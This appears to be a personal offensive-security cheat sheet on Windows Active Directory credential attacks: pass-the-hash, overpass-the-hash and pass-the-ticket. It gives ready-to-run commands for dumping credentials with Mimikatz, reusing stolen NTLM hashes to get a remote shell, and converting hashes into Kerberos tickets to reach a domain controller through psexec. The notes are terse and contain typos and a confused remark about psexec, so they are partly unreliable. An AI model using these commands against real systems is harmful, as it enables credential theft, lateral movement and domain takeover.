### Pass the hash

Assumption: Unauthorized access to the password hash of local administrator

```
pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe
```

[Ref](https://www.kali.org/tools/winexe/)


### Overpass the hash

Assumption: compromised a workstation that the user has authenticated to and machine is caching. (NTLM hash)


If we have compromised admin credentials, we could Open anything as administrator that will store hash.

Why is this even required if you already have password? Because kerberos doesnot use plain text password.


### mimikatz
`sekurlsa::logonpasswords`

Gain NTLM Hash

This is to turn HTLM hash to kerberos ticket

### PTH

```powershell
sekurlsa::pth /user:<USERNAME> /domain:<CORP.COM> /ntlm:HASH /run:<POWERSHELL>
```

This will allow to run authenticate with TGT

`net use \\DC`

`klist`

this will give us kerberos ticket includes TGT & TGS

Now we have converted NTLM hash to TGT.
psexec can run command remotely but only without password hash.

We can control and run commands by using TGT.

`psexec \\DC cmd.exe`

This will use above generate TGT.


### pass the ticket.

This is all about taking advantage of the TGS. Once we obtain TGS you may export & re-inject elsewhere in the network.

If TGS belongs to current user -> No admin privilege required.
If a service is registered with SPN (service principal name) -> Bling Bling.


